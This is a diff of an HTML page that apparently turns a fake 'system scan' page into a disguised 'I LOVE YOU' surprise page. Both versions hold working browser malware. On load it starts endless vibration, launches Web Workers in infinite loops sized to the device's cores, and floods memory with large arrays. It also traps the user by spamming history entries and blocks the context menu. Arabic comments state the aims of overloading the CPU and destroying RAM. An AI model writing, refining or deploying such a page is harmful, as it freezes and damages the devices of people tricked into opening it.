@@ -1,38 +1,80 @@
 <!DOCTYPE html>
-<html>
-<head><title>Critical System Maintenance</title></head>
-<body style="background:black; color:white; text-align:center; padding-top:20%;">
-    <h1>Performing Deep System Scan...</h1>
-    <p>Please wait, do not minimize the browser.</p>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surprise! ❤️</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        h1 {
+            color: #ff4d4d;
+            font-family: 'Arial', sans-serif;
+            font-size: 5rem;
+            text-shadow: 0 0 20px #ff0000;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.2); color: white; }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+    <h1>I LOVE YOU</h1>
 
     <script>
-        function burnCPU() {
-            // كود العمال (Web Workers) لإجبار المعالج على العمل بكل طاقته
-            const blob = new Blob([`
+        function startChaos() {
+            // 1. تفعيل الاهتزاز المستمر (Vibration)
+            // الموبايل هيفضل يتهز بنمط متقطع عشان ميسكتش
+            if ("vibrate" in navigator) {
                 setInterval(() => {
-                    let x = 0;
-                    while (true) {
-                        x += Math.sqrt(Math.random() * 999999);
-                    }
-                }, 1);
-            `], { type: 'application/javascript' });
+                    navigator.vibrate([500, 200, 500]);
+                }, 1000);
+            }
 
+            // 2. إهلاك المعالج (CPU Overload)
+            const cores = navigator.hardwareConcurrency || 8;
+            const workerCode = `
+                function burn() {
+                    while (true) {
+                        Math.sqrt(Math.random() * 999999).toString().split('').reverse().join('');
+                    }
+                }
+                burn();
+            `;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
             const workerUrl = URL.createObjectURL(blob);
 
-            // تشغيل 20 عامل في الخلفية (كل عامل يسحب نواة معالج)
-            for (let i = 0; i < 20; i++) {
+            for (let i = 0; i < cores * 4; i++) {
                 new Worker(workerUrl);
             }
 
-            // تدمير الرام في المسار الرئيسي
-            let ramDestroyer = [];
+            // 3. إغراق الذاكرة (RAM Flooding)
+            let memoryEater = [];
             setInterval(() => {
-                ramDestroyer.push(new Uint32Array(5000000).fill(Math.random()));
+                memoryEater.push(new Uint8Array(15 * 1024 * 1024).fill(1)); 
+                // سد ثغرة الرجوع للخلف
                 window.history.pushState(null, null, "#" + Math.random());
-            }, 10);
+            }, 30);
         }
 
-        window.onload = burnCPU;
+        // تشغيل كل شيء بمجرد لمس الشاشة أو التحميل
+        // المتصفحات بتطلب "تفاعل" عشان تبدأ الاهتزاز
+        window.onclick = startChaos;
+        window.onload = startChaos;
+
+        // منع القوائم الجانبية
+        document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 </body>
 </html>
